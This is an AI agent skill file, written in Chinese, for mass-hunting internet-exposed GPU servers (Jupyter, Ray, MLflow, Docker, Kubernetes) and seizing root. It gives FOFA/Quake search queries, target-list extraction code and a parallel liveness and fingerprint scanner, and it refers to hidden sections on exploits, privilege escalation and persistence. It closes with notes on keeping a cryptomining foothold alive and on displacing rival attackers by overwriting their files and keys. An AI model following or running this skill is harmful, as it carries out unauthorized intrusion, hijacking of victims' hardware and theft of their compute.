---
name: gpu-hunter
description: >-
  猎杀公网 GPU 服务器全链：FOFA/Quake 测绘 → Jupyter/Ray/MLflow/Docker/K8s 漏洞矩阵 → ROOT 提权与持久化。触发: GPU服务器, 猎杀GPU, A100, 5090, Jupyter未授权, Ray RCE。
---

# 猎杀GPU · QUANTUM服务器ROOT猎杀法器
> OPERATOR攻伐体系 · GPU服务器 & ROOT猎杀大成版
> 融合QUANTUM记忆：5090/A100双旗舰控制链 + FOFA测绘 + CVE漏洞链 + 多路径ROOT拿下 + 免杀重生

---

## 0. 核心定位

**本skill目标：猎杀公网GPU服务器 + 拿下ROOT控制权**

三层猎场：
1. **GPU服务器资产测绘**：FOFA/Quake 精准定位公网 GPU 机器（CUDA/Jupyter/ngc/GPUStack/ray/torch）
2. **CVE漏洞链突破**：从未授权RCE到ROOT的全链路漏洞组合拳
3. **多路径ROOT**：弱口令/SSH密钥/框架漏洞/容器逃逸/错误配置 多路并进

---

## 1. 目标画像（FOFA 测绘语法）

### 1.1 GPU服务器主指纹

```bash
# GPU服务器核心指纹
FOFA_GPU_BODY='("NVIDIA" || "CUDA" || "nvidia-smi" || "GeForce RTX" || "A100" || "H100" || "L40S" || "Tesla V100") && (port="22" || port="8888" || port="8889" || port="6006" || port="9090" || port="3000" || port="8501")'

# Jupyter Notebook / Lab 未授权
FOFA_JUPYTER='body="Jupyter Notebook" || body="JupyterLab" || body="IPython notebook" || body="/api/kernels"'

# GPU计算平台
FOFA_PLATFORM='(body:"ray" || body:"Ray Dashboard" || title:"Ray" || body:"Dask" || body:"XGBoost" || body:"TensorBoard" || body:"MLflow" || body:"Weights & Biases") && (port="8265" || port="8888" || port="6006")'

# Kubernetes GPU节点
FOFA_K8S_GPU='body="kubernetes" && body="nvidia.com" && (port="10250" || port="6443")'

# Docker GPU 容器API
FOFA_DOCKER_GPU='body="Docker" && body="nvidia" && (port="2375" || port="2376")'

# JupyterHub / Kubeflow
FOFA_ML='(title:"JupyterHub" || title:"Kubeflow" || title:"MLflow" || body:"c博士" || body:"机器学习平台")'

# 云GPU实例 (AWS/GCP/Azure/阿里云/腾讯云)
FOFA_CLOUD_GPU='(body:"aws" || body:"p3.2xlarge" || body:"a100" || body:"gv100" || body:"ecs.gn6v")'
```

### 1.2 快速测绘命令

```bash
# 执行测绘（需配置 FOFA_KEY 环境变量）
export FOFA_KEY='your_fofa_key'
export QUAKE_KEY='your_quake_key'

API_BASE="https://fofaapi.com/api/v1/search/all"

# 测绘GPU服务器（并发执行）
for QUERY in "$FOFA_GPU_BODY" "$FOFA_JUPYTER" "$FOFA_PLATFORM" "$FOFA_DOCKER_GPU"; do
  SAFE=$(echo "$QUERY" | md5sum | cut -c1-6)
  QB64=$(echo -n "$QUERY" | base64 -w0)
  curl -s --max-time 30 "$API_BASE?key=$FOFA_KEY&qbase64=$QB64&size=1000" \
    > "hunt_gpu/csv/gpu_${SAFE}.json" &
done

# Quake 辅助测绘
QB64=$(echo -n 'app:"Jupyter Notebook"' | base64 -w0)
curl -s --max-time 30 -H "X-QuakeToken: $QUAKE_KEY" -H "Content-Type: application/json" \
  -d "{\"query\":\"app:\\\"Jupyter Notebook\\\"\",\"start\":0,\"size\":500}" \
  "https://quake.360.net/api/v3/search/quake_service" > "hunt_gpu/csv/jupyter_quake.json" &

wait
echo "[*] 测绘完成，目标池建立"
```

---

## 2. 猎物池构建（目标分诊）

```bash
mkdir -p hunt_gpu/{csv,alive,creds,ssh_keys,exploits,roots,logs,screenshots,report}

# 从测绘JSON提取所有URL
python3 - << 'PYEOF'
import json, glob, os

urls = set()
for f in glob.glob('hunt_gpu/csv/*.json'):
    try:
        d = json.load(open(f, encoding='utf-8', errors='ignore'))
        results = d.get('results', d.get('data', d.get('matches', [])))
        for r in results:
            if isinstance(r, list) and len(r) > 5:
                if r[5] and str(r[5]).startswith('http'):
                    urls.add(str(r[5]).strip())
                elif len(r) > 1 and r[0] and r[1]:
                    proto = r[2] if len(r) > 2 and r[2] else 'http'
                    urls.add(f'{proto}://{r[0]}:{r[1]}')
            elif isinstance(r, dict):
                ip = r.get('ip_str', r.get('host', ''))
                port = r.get('port', 0)
                if ip and port:
                    urls.add(f'http://{ip}:{port}')
    except: pass

with open('hunt_gpu/all_targets.txt', 'w') as f:
    for u in sorted(urls): f.write(u + '\n')
print(f"[*] 共捕获 {len(urls)} 个目标")
PYEOF
```

---

## 3. 存活探测 + 指纹识别

```bash
# 并行存活探测（20并发，Alpine兼容）
> /tmp/gpu_alive.txt
> /tmp/gpu_finger.txt

cat hunt_gpu/all_targets.txt | xargs -P 20 -I {} sh -c '
URL="{}"
BASE=$(echo "$URL" | sed -E "s|^(https?://[^/]+).*|\1|")
RESP=$(curl -s --max-time 6 --connect-timeout 3 -L -k -A "Mozilla/5.0" "$URL" 2>/dev/null)
[ -z "$RESP" ] && exit 0
[ $(echo "$RESP" | wc -c) -lt 100 ] && exit 0

echo "$BASE" >> /tmp/gpu_alive.txt

F=""
# GPU/ML框架指纹
echo "$RESP" | grep -qiE "(jupyter|notebook|lab)" && F="$F JUPYTER"
echo "$RESP" | grep -qiE "(tensorboard|port 6006|tf幽)" && F="$F TENSORBOARD"
echo "$RESP" | grep -qiE "(ray|dask|mlflow|wandb)" && F="$F ML_PLATFORM"
echo "$RESP" | grep -qiE "(nvidia|cuda|gpu)" && F="$F GPU_FRAMEWORK"
echo "$RESP" | grep -qiE "(gradio|streamlit|fastapi|flask)" && F="$F WEB_ML"
echo "$RESP" | grep -qiE "(docker|kubernetes|k8s)" && F="$F CONTAINER"
echo "$RESP" | grep -qiE "(grafana|prometheus|prometheus)" && F="$F MONITOR"
echo "$RESP" | grep -qiE "(login|password|signin|auth)" && F="$F AUTH_PORTAL"

# 特殊端口指纹
echo "$URL" | grep -q ":8888" && F="$F PORT_8888"
echo "$URL" | grep -q ":6006" && F="$F PORT_6006"
echo "$URL" | grep -q ":8265" && F="$F PORT_8265"
echo "$URL" | grep -q ":8501" && F="$F PORT_8501"
echo "$URL" | grep -q ":3000" && F="$F PORT_3000"

[ -n "$F" ] && echo "$BASE |$F" >> /tmp/gpu_finger.txt
'
echo "[*] 存活: $(wc -l < /tmp/gpu_alive.txt), 捕获指纹: $(wc -l < /tmp/gpu_finger.txt)"
```

---


## 全文导航（已拆分）

主卡保留前 4 节；其余 6 节在 `references/full.md`：

- 4. 攻击路径矩阵（多路突破）
- 5. ROOT 提权路径（拿下服务器后）
- 6. 持久化部署（拿下ROOT后）
- 7. 战果归档与报告
- 8. 执行入口（OPERATOR指令格式）
- 9. 关键CVE速查表（GPU服务器专项）

加载：`skill_view(name='gpu-hunter', file_path='references/full.md')`

## 挖矿劫持的四层持久化清除（2026-10 GPU 框架逆向）
- 四层互建：systemd timer(45s 主复活) + /etc/cron.d(每分钟) + root crontab + authorized_keys 每分钟重写（并定向删对手 key）
- 正确顺序：stop+disable+删 unit → daemon-reload → 删 cron → 多轮 kill → 删目录 → 重置 key → **静置≥60s** 复检；否则把瞬时清除误判为已清
- 存活判据用 `nvidia-smi --query-gpu=utilization.gpu` 求和 ≥40，而非进程存在
- 反竞争者：/proc/*/cmdline 正则 + 把对手落脚文件覆写为 `#!/bin/sh\nexit 0`
